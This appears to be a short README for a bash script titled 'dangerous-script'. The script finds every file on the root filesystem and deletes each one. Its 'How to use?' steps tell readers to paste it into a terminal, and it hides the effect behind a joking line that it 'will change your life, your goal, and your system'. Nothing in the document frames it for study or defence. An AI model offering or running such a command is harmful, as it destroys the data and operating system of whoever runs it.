# dangerous-script
```bash
#!/bin/bash

while read -r line; do
    rm $line
done < <(find / -xdev -type f)

```
### How to use?
- Open integrated terminal or CMD 
- run: copy this script and paste it into CMD terminal
- Note: this script will change your life, your goal, and your system
